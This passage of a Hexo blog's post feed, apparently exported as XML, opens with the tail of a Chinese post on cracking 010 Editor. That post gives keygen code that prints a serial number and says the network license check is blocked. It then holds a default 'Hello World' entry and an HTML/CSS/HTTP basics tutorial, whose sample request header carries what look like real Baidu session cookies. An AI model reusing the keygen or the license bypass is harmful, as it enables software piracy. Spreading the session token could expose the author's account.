class="number">0x4D30</span>) ^ <span class="number">0x3421</span>) &amp; <span class="number">0xFFFF</span>;</span><br><span class="line"><span class="comment">//余数等于0 直接退出并返回商 ，余数不为0则返回0</span></span><br><span class="line"><span class="comment">//EAX &lt;= 0x3E8</span></span><br><span class="line"><span class="keyword">if</span> (EAX % <span class="number">0xB</span> == <span class="number">0</span> &amp;&amp; EAX / <span class="number">0xB</span> == Reslt)</span><br><span class="line">&#123;</span><br><span class="line">K[<span class="number">1</span>] = K1;</span><br><span class="line">K[<span class="number">2</span>] = K2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> index = <span class="number">0</span>; index &lt; <span class="keyword">sizeof</span>(K); index++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%02X&quot;</span>,K[index]);</span><br><span class="line"><span class="keyword">if</span> (index % <span class="number">2</span> != <span class="number">0</span> &amp;&amp; index != <span class="keyword">sizeof</span>(K)<span class="number">-1</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;-&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">getchar();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="运行测试"><a href="#运行测试" class="headerlink" title="运行测试"></a>运行测试</h4><p>运行结果</p><img src="010Editor的逆向/CodeRun.png" title="Mr.Hu-Image" alt="Mr.Hu-Image"/><p>把这串序列号和用户米输入试一下</p><img src="010Editor的逆向/RunNetwork.png" title="Mr.Hu-Image" alt="Mr.Hu-Image"/><p>然后发现网络验证失败，这个时候需要把网络验证给屏蔽掉，具体方法在暴力破解时已经简述</p><h4 id="成功破解"><a href="#成功破解" class="headerlink" title="成功破解"></a>成功破解</h4><p>屏蔽网络后发现就成功了，</p><img src="010Editor的逆向/Vector3.png" title="Mr.Hu-Image" alt="Mr.Hu-Image"/>]]></content>
      
      
      <categories>
          
          <category> 逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逆向 </tag>
            
            <tag> 破解 </tag>
            
            <tag> x86汇编 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="2020/12/05/hello-world/"/>
      <url>2020/12/05/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      <categories>
          
          <category> 主题优化 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> help </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WEB前端基础</title>
      <link href="2020/11/15/WEB%E5%89%8D%E7%AB%AF%E5%9F%BA%E7%A1%80/"/>
      <url>2020/11/15/WEB%E5%89%8D%E7%AB%AF%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<h1 id="WEB通信"><a href="#WEB通信" class="headerlink" title="WEB通信"></a>WEB通信</h1><h2 id="web通信机制"><a href="#web通信机制" class="headerlink" title="web通信机制"></a>web通信机制</h2><p>最基本的http请求方式:</p><ol><li>客户端向服务器端发起一个请求</li><li>服务器端接收到请求后会在服务器端进行业务逻辑处理运算</li><li>服务器端返回结果到客户端</li></ol><p>一个很实在的例子就是当你打开这个页面是，浏览器根据网址向网站服务器发送请求，服务器端返回这个页面的内容，然后你开始浏览这篇文章，在你阅读这 篇文章的时候服务器端，如果作者更新了这篇文章，你不重新F5刷新页面，那你是不知道这篇文章已经被更新了的，而且刷新一个页面所耗费的资源是比较多的。 这是比较原始的一直更新内容的方式，当然像这样的技术文章也不需要实现实时的更新。</p><h2 id="http协议"><a href="#http协议" class="headerlink" title="http协议"></a>http协议</h2><p>web通信中最常用的协议</p><p>超文本传输协议（HyperText Transfer Protocol，缩写：http）是一种用于分布式，协作和超媒体信息系统的应用层协议。http是万维网的数据通信基础</p><h3 id="http协议特点"><a href="#http协议特点" class="headerlink" title="http协议特点"></a>http协议特点</h3><h4 id="简单方便"><a href="#简单方便" class="headerlink" title="简单方便"></a>简单方便</h4><p>客户端服务器请求服务时，只需要传送请求方法和路径。</p><h4 id="灵活"><a href="#灵活" class="headerlink" title="灵活"></a>灵活</h4><p>http允许传输任意类型的数据对象，正在传输的类型由Content-Type加以标记</p><h4 id="无连接无状态"><a href="#无连接无状态" class="headerlink" title="无连接无状态"></a>无连接无状态</h4><p>无连接的含义时限制每次连接只处理一个请求，服务器处理完客户的请求，并受到客户的响应后，断开连接，采用这种方式可以节省传输时间。另一方面，无连接意味着无状态</p><p>无状态是指协议对于事物的处理没有记忆能力。缺少状态意味着如果后续处理许哟啊前面的信息就必须重传，这样可能导致每次连接传送的数据量增大（一般而言，服务器通过每一个登陆永固维持一个绘画session来记忆其状态）</p><h3 id="http请求方式"><a href="#http请求方式" class="headerlink" title="http请求方式"></a>http请求方式</h3><p>GET： 请求指定的页面信息，并返回实体主体。<br> HEAD： 只请求页面的首部。<br> POST： 请求服务器接受所指定的文档作为对所标识的URI的新的从属实体。<br> PUT： 从客户端向服务器传送的数据取代指定的文档的内容。<br> DELETE： 请求服务器删除指定的页面。<br> OPTIONS： 允许客户端查看服务器的性能。<br> TRACE： 请求服务器在响应中的实体主体部分返回所得到的内容。<br> PATCH： 实体中包含一个表，表中说明与该URI所表示的原内容的区别。<br> MOVE： 请求服务器将指定的页面移至另一个网络地址。<br> COPY： 请求服务器将指定的页面拷贝至另一个网络地址。<br> LINK： 请求服务器建立链接关系。<br> UNLINK： 断开链接关系。<br> WRAPPED： 允许客户端发送经过封装的请求。<br> Extension-mothed：在不改动协议的前提下，可增加另外的方法。</p><h3 id="http协议状态码"><a href="#http协议状态码" class="headerlink" title="http协议状态码"></a>http协议状态码</h3><p>1xx：指示信息–表示请求已接收，继续处理。<br> 2xx：成功–表示请求已被成功接收、理解、接受。<br> 3xx：重定向–要完成请求必须进行更进一步的操作。<br> 4xx：客户端错误–请求有语法错误或请求无法实现。<br> 5xx：服务器端错误–服务器未能实现合法的请求。常见状态代码、状态描述的说明如下。<br> 200 OK：客户端请求成功。<br> 400 Bad Request：客户端请求有语法错误，不能被服务器所理解。<br> 401 Unauthorized：请求未经授权，这个状态代码必须和WWW-Authenticate报头域一起使用。<br> 403 Forbidden：服务器收到请求，但是拒绝提供服务。<br> 404 Not Found：请求资源不存在，举个例子：输入了错误的URL。<br> 500 Internal Server Error：服务器发生不可预期的错误。<br> 503 Server Unavailable：服务器当前不能处理客户端的请求，一段时间后可能恢复正常</p><h3 id="http-url"><a href="#http-url" class="headerlink" title="http url"></a>http url</h3><p>URL（Uniform Resource Locator,统一资源定位器），它是WWW的统一资源定位标志，就是指网络地址。</p><p><strong>格式<a href="http://host:port/path">http://host:port/path</a></strong></p><p>http:表示通过http协议来定位网络资源</p><p>host：表示合法的Internet主机域名或者IP地址</p><p>port：指定的端口号（为空http协议默认使用80端口）</p><p>path：指定请求的url资源</p><h3 id="http请求格式"><a href="#http请求格式" class="headerlink" title="http请求格式"></a>http请求格式</h3><h4 id="访问百度响应头"><a href="#访问百度响应头" class="headerlink" title="访问百度响应头"></a>访问百度响应头</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Bdpagetype: 2</span><br><span class="line">Bdqid: 0xe635a52c00042745</span><br><span class="line">Cache-Control: private</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Encoding: gzip</span><br><span class="line">Content-Type: text/html;charset=utf-8</span><br><span class="line">Date: Sun, 15 Nov 2020 05:10:45 GMT</span><br><span class="line">Expires: Sun, 15 Nov 2020 05:10:45 GMT</span><br><span class="line">Server: BWS/1.1</span><br><span class="line">Set-Cookie: BDSVRTM=228; path=/</span><br><span class="line">Set-Cookie: BD_HOME=1; path=/</span><br><span class="line">Set-Cookie: H_PS_PSSID=32810_1428_33038_32952_33060_31253_32973_32705_33099_33101_32962_32937_32845; path=/; domain=.baidu.com</span><br><span class="line">Strict-Transport-Security: max-age=172800</span><br><span class="line">Traceid: 1605417045283252404216588346410886506309</span><br><span class="line">X-Ua-Compatible: IE=Edge,chrome=1</span><br><span class="line">Transfer-Encoding: chunked</span><br></pre></td></tr></table></figure><img src="WEB前端基础/SendHead.jpg" title="Mr.Hu-Image" alt="Mr.Hu-Image"/><h4 id="请求头"><a href="#请求头" class="headerlink" title="请求头"></a>请求头</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9,en;q&#x3D;0.8,en-GB;q&#x3D;0.7,en-US;q&#x3D;0.6</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Cookie: BAIDUID&#x3D;849E1C2EF8BC2F4DD48CDDDD356FC900:FG&#x3D;1; BIDUPSID&#x3D;849E1C2EF8BC2F4D54C403BDD229E1B3; PSTM&#x3D;1603081365; BD_UPN&#x3D;12314753; BDORZ&#x3D;B490B5EBF6F3CD402E515D22BCDA1598; BDUSS&#x3D;TdmQkQ5S1UwZ01hclNmbGRycktGMVBDZ2xRZkYyNU4zclpVSE81MGhPYWpqdEZmRVFBQUFBJCQAAAAAAAAAAAEAAAC4lc0~vb-6zs69z6rLrtLgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAKMBql-jAapfO; BDUSS_BFESS&#x3D;TdmQkQ5S1UwZ01hclNmbGRycktGMVBDZ2xRZkYyNU4zclpVSE81MGhPYWpqdEZmRVFBQUFBJCQAAAAAAAAAAAEAAAC4lc0~vb-6zs69z6rLrtLgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAKMBql-jAapfO; BD_HOME&#x3D;1; H_PS_PSSID&#x3D;32810_1428_33038_32952_33060_31253_32973_32705_33099_33101_32962_32937_32845; BDRCVFR[feWj1Vr5u3D]&#x3D;I67x6TjHwwYf0; delPer&#x3D;0; BD_CK_SAM&#x3D;1; PSINO&#x3D;1; sug&#x3D;3; sugstore&#x3D;0; ORIGIN&#x3D;2; bdime&#x3D;0; H_PS_645EC&#x3D;26efHYANGrZAAsM4NaeJh6Zgrjav3uUNE7n1vzEpLdgGLUuAW2ipRiC1R4WaxSNycZn0; BA_HECTOR&#x3D;042h0g250020a0arug1fr1ds60o; BDSVRTM&#x3D;0</span><br><span class="line">Host: www.baidu.com</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-Site: none</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;86.0.4240.198 Safari&#x2F;537.36 Edg&#x2F;86.0.622.69</span><br></pre></td></tr></table></figure><img src="WEB前端基础/PostHead.jpg" title="Mr.Hu-Image" alt="Mr.Hu-Image"/><p>http参数详解</p><table><thead><tr><th>Header</th><th>解释</th><th>示例</th></tr></thead><tbody><tr><td>Accept</td><td>指定客户端能够接收的内容类型</td><td>Accept: text/plain, text/html</td></tr><tr><td>Accept-Charset</td><td>浏览器可以接受的字符编码集。</td><td>Accept-Charset: iso-8859-5</td></tr><tr><td>Accept-Encoding</td><td>指定浏览器可以支持的web服务器返回内容压缩编码类型。</td><td>Accept-Encoding: compress, gzip</td></tr><tr><td>Cookie</td><td>HTTP请求发送时，会把保存在该请求域名下的所有cookie值一起发送给web服务器。</td><td>Cookie: $Version=1; Skin=new;</td></tr><tr><td>onnection</td><td>表示是否需要持久连接。（HTTP 1.1默认进行持久连接）</td><td>Connection: close</td></tr><tr><td>Accept-Language</td><td>浏览器可接受的语言</td><td>Accept-Language: en,zh</td></tr><tr><td>Referer</td><td>先前网页的地址，当前请求网页紧随其后,即来路</td><td>Referer: <a href="http://www.zcmhi.com/archives/71.html">http://www.zcmhi.com/archives/71.html</a></td></tr><tr><td>Host</td><td>指定请求的服务器的域名和端口号</td><td>Host: <a href="https://blog.csdn.net/leixingbang1989/article/details/www.zcmhi.com">www.zcmhi.com</a></td></tr><tr><td>From</td><td>发出请求的用户的Email</td><td>From: <a href="mailto:&#x75;&#115;&#101;&#114;&#x40;&#101;&#109;&#97;&#x69;&#x6c;&#46;&#99;&#111;&#109;">&#x75;&#115;&#101;&#114;&#x40;&#101;&#109;&#97;&#x69;&#x6c;&#46;&#99;&#111;&#109;</a></td></tr></tbody></table><h3 id="重要字段"><a href="#重要字段" class="headerlink" title="重要字段"></a>重要字段</h3><p>Content-Type 请求内容类型</p><p>User-Agent 请求的浏览器环境，常用于反爬虫</p><p>Referer 请求的源地址，常用于反盗链</p><p>Cookie 本地登陆或访问凭证</p><h2 id="网站搭建"><a href="#网站搭建" class="headerlink" title="网站搭建"></a>网站搭建</h2><h1 id="HTML语言基础"><a href="#HTML语言基础" class="headerlink" title="HTML语言基础"></a>HTML语言基础</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>HTML指的是超文本标记语言（Hyper Text Markup Luaguage）</p><p>1980年，物理学家蒂姆-伯纳斯-李在欧洲核子研究中心，在工程承包期间，为使CERN的研究人员使用并共享文档，他提出并船舰原型系统ENQUIRE。1989年，伯纳斯-李在一备忘录中提出一个基础互联网的超文本系统。他规定了HTML并在1990年底写出浏览器和服务器软件</p><h2 id="网页的三大组成部分"><a href="#网页的三大组成部分" class="headerlink" title="网页的三大组成部分"></a>网页的三大组成部分</h2><p>结构标准：结构对网页元素进行整理和分类，指的是HTML</p><p>表现标准：表现用于设置网页元素的版式、颜色、大小等外观样式，主要指的是CSS</p><p>行为标准：行为是指网页模型的定义及交互的编写，指的的是JavaScript</p><h2 id="HTML常用标签"><a href="#HTML常用标签" class="headerlink" title="HTML常用标签"></a>HTML常用标签</h2><h3 id="文本标签"><a href="#文本标签" class="headerlink" title="文本标签"></a>文本标签</h3><table><thead><tr><th>&lt;h1&gt;&lt;/h1&gt;-&lt;h6&gt;&lt;/h6&gt;</th><th>标题</th></tr></thead><tbody><tr><td>&lt;hr&gt;</td><td>分割线</td></tr><tr><td>&lt;br&gt;</td><td>换行</td></tr><tr><td>&lt;p&gt;&lt;/p&gt;</td><td>段落</td></tr><tr><td>&lt;i&gt;&lt;/i&gt;</td><td>斜体</td></tr><tr><td>&lt;em&gt;&lt;/em&gt;</td><td>强调斜体</td></tr><tr><td>&lt;b&gt;&lt;/b&gt;</td><td>加粗</td></tr><tr><td>&lt;strong&gt;&lt;/strong&gt;</td><td>强调加粗</td></tr><tr><td>&lt;del&gt;&lt;/del&gt;</td><td>删除线</td></tr><tr><td>&lt;sup&gt;&lt;/sup&gt;</td><td>上标</td></tr><tr><td>&lt;sub&gt;&lt;/sub&gt;</td><td>下标</td></tr></tbody></table><h3 id="特殊字符"><a href="#特殊字符" class="headerlink" title="特殊字符"></a>特殊字符</h3><table><thead><tr><th>属性</th><th>显示样式</th></tr></thead><tbody><tr><td>&amp;It</td><td>&lt;</td></tr><tr><td>&amp;gt</td><td>&gt;</td></tr><tr><td>&amp;reg</td><td>®</td></tr><tr><td>&amp;copy</td><td>©</td></tr><tr><td>&amp;trade</td><td>™</td></tr><tr><td>&amp;nbsp</td><td>(空格)</td></tr></tbody></table><h3 id="列表标签"><a href="#列表标签" class="headerlink" title="列表标签"></a>列表标签</h3><p>列表标签分为无序、有序、定义列表</p><h4 id="无序列表"><a href="#无序列表" class="headerlink" title="无序列表"></a>无序列表</h4><p>标签&lt;ul&gt;，列表项&lt;li&gt;</p><p>​    &lt;ul&gt;&lt;li&gt;列表&lt;/li&gt;&lt;/ul&gt;</p><p>​    &lt;ul&gt;&lt;li&gt;列表&lt;/li&gt;&lt;/ul&gt;</p><p>​    &lt;ul&gt;&lt;li&gt;列表&lt;/li&gt;&lt;/ul&gt;</p><h5 id="Type属性值"><a href="#Type属性值" class="headerlink" title="Type属性值"></a>Type属性值</h5><table><thead><tr><th>值</th><th>描述</th></tr></thead><tbody><tr><td>disc</td><td>圆点</td></tr><tr><td>square</td><td>正方形</td></tr><tr><td>circle</td><td>空心圆</td></tr></tbody></table><h4 id="有序列表"><a href="#有序列表" class="headerlink" title="有序列表"></a>有序列表</h4><p>&lt;ol&gt;&lt;li&gt;列表&lt;/li&gt;&lt;/ol&gt;</p><p>&lt;ol&gt;&lt;li&gt;列表&lt;/li&gt;&lt;/ol&gt;</p><p>&lt;ol&gt;&lt;li&gt;列表&lt;/li&gt;&lt;/ol&gt;</p><h5 id="Type属性值-1"><a href="#Type属性值-1" class="headerlink" title="Type属性值"></a>Type属性值</h5><table><thead><tr><th>值</th><th>描述</th></tr></thead><tbody><tr><td>1</td><td>数字1，2…</td></tr><tr><td>a</td><td>小写字母a,b…</td></tr><tr><td>A</td><td>大写字母A，B…</td></tr><tr><td>i</td><td>小写罗马数字 i,ⅱ…</td></tr><tr><td>I</td><td>大写罗马数字Ⅰ，Ⅱ…</td></tr></tbody></table><h4 id="定义列表"><a href="#定义列表" class="headerlink" title="定义列表"></a>定义列表</h4><p>&lt;dl&gt;</p><p>​    &lt;dt&gt;定义列表项&lt;/dt&gt;</p><p>​    &lt;dd&gt;定义列表描述&lt;/dd&gt;</p><p>​    &lt;dd&gt;定义列表描述&lt;/dd&gt;</p><p>​    &lt;dt&gt;定义列表项&lt;/dt&gt;</p><p>​    &lt;dd&gt;定义列表描述&lt;/dd&gt;</p><p>​    &lt;dd&gt;定义列表描述&lt;/dd&gt;</p><p>….</p><p>&lt;/dl&gt;</p><h3 id="图像标签"><a href="#图像标签" class="headerlink" title="图像标签"></a>图像标签</h3><p>语法：</p><p>&lt;img src=”” alt=”” …&gt;</p><h4 id="属性值"><a href="#属性值" class="headerlink" title="属性值"></a>属性值</h4><table><thead><tr><th>属性</th><th>值</th><th>描述</th></tr></thead><tbody><tr><td>Src</td><td>URL</td><td>显示图像的URL</td></tr><tr><td>Alt</td><td>文字</td><td>图像替代文本</td></tr><tr><td>Height</td><td>数值和百分比</td><td>图像的高</td></tr><tr><td>Width</td><td>数值和百分比</td><td>图像的宽</td></tr></tbody></table><h3 id="超链接标签"><a href="#超链接标签" class="headerlink" title="超链接标签"></a>超链接标签</h3><p>语法</p><p>&lt;a herf=”” &gt;&lt;/a&gt;</p><p>herf：链接地址，可以是内部连接也可以是外部连接</p><h4 id="属性值-1"><a href="#属性值-1" class="headerlink" title="属性值"></a>属性值</h4><table><thead><tr><th>属性</th><th>描述</th></tr></thead><tbody><tr><td>herf</td><td>链接地址</td></tr><tr><td>target</td><td>链接得到目标窗口_self（本页跳转）、__blank(新窗口)、_top_parent</td></tr><tr><td>title</td><td>链接显示文字</td></tr><tr><td>name</td><td>链接命名</td></tr><tr><td></td><td></td></tr></tbody></table><h3 id="表格"><a href="#表格" class="headerlink" title="表格"></a>表格</h3><table><thead><tr><th>名</th><th>描述</th></tr></thead><tbody><tr><td>table</td><td>表格</td></tr><tr><td>caption</td><td>标题</td></tr><tr><td>tr</td><td>行标签</td></tr><tr><td>th</td><td>列头标签</td></tr><tr><td>td</td><td>列标签</td></tr><tr><td></td><td></td></tr><tr><td></td><td></td></tr></tbody></table><h4 id="属性值-2"><a href="#属性值-2" class="headerlink" title="属性值"></a>属性值</h4><table><thead><tr><th>属性</th><th>值</th><th>描述</th></tr></thead><tbody><tr><td>Cellpadding</td><td>数值</td><td>单元格内容与其边框之间距离（边距）</td></tr><tr><td>Cellspacing</td><td>数值</td><td>单元格之间的距离</td></tr><tr><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td></tr></tbody></table><h3 id="表单"><a href="#表单" class="headerlink" title="表单"></a>表单</h3><p>&lt;form&gt;&lt;/form&gt;</p><h4 id="属性值-3"><a href="#属性值-3" class="headerlink" title="属性值"></a>属性值</h4><table><thead><tr><th>属性</th><th>描述</th></tr></thead><tbody><tr><td>action</td><td>提交目的的地址</td></tr><tr><td>method</td><td>提交方式（Post、Get）</td></tr><tr><td>enctype</td><td>提交类型</td></tr><tr><td>target</td><td>在何处打开目标URL</td></tr></tbody></table><h4 id="input标签"><a href="#input标签" class="headerlink" title="input标签"></a>input标签</h4><p>&lt;input type=”” name=””&gt;</p><h4 id="input类型值"><a href="#input类型值" class="headerlink" title="input类型值"></a>input类型值</h4><p>text、password、number、button、reset、submit、hidden、radio、checkbox、file、image、color、range、date、month、week、time、datetime-local。</p><table><thead><tr><th>属性</th><th>描述</th><th>示例</th></tr></thead><tbody><tr><td>text</td><td>文本</td><td>&lt;input type=”text” /&gt;</td></tr><tr><td>password</td><td>密码</td><td>&lt;input type=”password” /&gt;</td></tr><tr><td>number</td><td>数字</td><td></td></tr><tr><td>button</td><td>按钮</td><td></td></tr><tr><td>range</td><td>滑动条</td><td></td></tr><tr><td>submit</td><td>提交</td><td></td></tr><tr><td>color</td><td>颜色</td><td>&lt;input type=”image” src=”<a href="http://p0.so.qhimgs1.com/bdr/_240_/t01cbdeda95800117ac.jpg&quot;">http://p0.so.qhimgs1.com/bdr/_240_/t01cbdeda95800117ac.jpg&quot;</a> /&gt;</td></tr><tr><td>radio</td><td>单选框</td><td>一组radio，name值一定要一样</td></tr><tr><td>checkbox</td><td>复选框</td><td>一组checkbox，name值一定要一样</td></tr><tr><td>file</td><td>选择文件</td><td></td></tr><tr><td>image</td><td>图像</td><td></td></tr><tr><td>date</td><td>日期</td><td></td></tr><tr><td>search</td><td>搜索框</td><td></td></tr><tr><td>reset</td><td>重置</td><td></td></tr><tr><td>hidden</td><td>隐藏</td><td>&lt;input type=”hidden” /&gt;</td></tr><tr><td>url</td><td>路径</td><td></td></tr></tbody></table><h1 id="CSS基础"><a href="#CSS基础" class="headerlink" title="CSS基础"></a>CSS基础</h1><h2 id="CSS简介"><a href="#CSS简介" class="headerlink" title="CSS简介"></a>CSS简介</h2><p>CSS，（Cascading Style Sheets），层叠样式列表</p><p>作用</p><p>​    结构与样式的分离，方便后期维护与改版</p><p>​    可以用多套样式，是网页由任意样式切换的效果</p><p>​    使页面载入的更快，降低服务器成本</p><h2 id="CSS样式和引入方式"><a href="#CSS样式和引入方式" class="headerlink" title="CSS样式和引入方式"></a>CSS样式和引入方式</h2><p>CSS引入方式有三种</p><p>​    内部：直接使用style标签    </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line">p&#123;</span><br><span class="line"></span><br><span class="line">background-color: red;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure><p>​    外部：link标签</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span> <span class="attr">herf</span>=<span class="string">&quot;import.css&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>​    行内：在标签内赋予style属性</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;backgroud-color: red;&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="CSS常用样式"><a href="#CSS常用样式" class="headerlink" title="CSS常用样式"></a>CSS常用样式</h2><h3 id="文本样式"><a href="#文本样式" class="headerlink" title="文本样式"></a>文本样式</h3><table><thead><tr><th>属性</th><th>属性值</th><th>作用</th></tr></thead><tbody><tr><td>color</td><td>表示颜色内容</td><td>设置文本颜色</td></tr><tr><td>direction</td><td>ltr、rtl（文本方向从右到左）</td><td>文本的反向/书写方向</td></tr><tr><td>letter-spacing</td><td>npx（n可以是负数）</td><td>字符间距</td></tr><tr><td>line-height</td><td>npx</td><td>背景是否随滚动条滚动</td></tr><tr><td>text-align</td><td>left、right、center、justify（两端对齐）</td><td>背景图像的起始位置</td></tr><tr><td>text-decoration</td><td>none、underline、overline、line-through</td><td>文本的修饰（下划线）</td></tr><tr><td>text-shadow</td><td>h-shadow、v-shadow、blurcolor</td><td>设置文本阴影</td></tr><tr><td>text-transform</td><td>none 、capitalize、uppercase、lowercase</td><td>改变字母大小写</td></tr><tr><td>text-indent</td><td>npx、nem</td><td>首行缩进</td></tr></tbody></table><h3 id="字体样式"><a href="#字体样式" class="headerlink" title="字体样式"></a>字体样式</h3><table><thead><tr><th>属性</th><th>属性值</th><th>作用</th></tr></thead><tbody><tr><td>font-family</td><td>隶书、仿宋、楷体等字体</td><td>设置字体</td></tr><tr><td>font-style</td><td>normal、italic、oblique</td><td>规定斜体文本</td></tr><tr><td>font-weight</td><td>normal、bold、100-900</td><td>文本的粗细</td></tr><tr><td>font-size</td><td>npx</td><td>字体大小</td></tr></tbody></table><h3 id="列表样式"><a href="#列表样式" class="headerlink" title="列表样式"></a>列表样式</h3><table><thead><tr><th>属性</th><th>属性值</th><th>作用</th></tr></thead><tbody><tr><td>list-style-type</td><td>none、disc、circle、square、decimal…</td><td>设置列表项目的外观</td></tr><tr><td>list-style-position</td><td>inside、outside</td><td>列表符号的位置</td></tr><tr><td>list-style-image</td><td>url、none</td><td>吧图像设置为列表项目的标记</td></tr><tr><td>list-style</td><td>同前面三个</td><td>简写属性，涵盖以后三个列表样式属性</td></tr></tbody></table><h2 id="CSS选择器"><a href="#CSS选择器" class="headerlink" title="CSS选择器"></a>CSS选择器</h2><p>​    在 CSS 中，选择器是一种模式，用于选择需要添加样式的元素。</p><table><thead><tr><th align="left">选择器</th><th align="left">例子</th><th align="left">例子描述</th><th align="left">CSS</th></tr></thead><tbody><tr><td align="left">class</td><td align="left">.intro</td><td align="left">选择 class=”intro” 的所有元素。</td><td align="left">1</td></tr><tr><td align="left">#id</td><td align="left">#firstname</td><td align="left">选择 id=”firstname” 的所有元素。</td><td align="left">1</td></tr><tr><td align="left">*</td><td align="left">*</td><td align="left">选择所有元素。</td><td align="left">2</td></tr><tr><td align="left">element</td><td align="left">p</td><td align="left">选择所有 <p> 元素。</td><td align="left">1</td></tr><tr><td 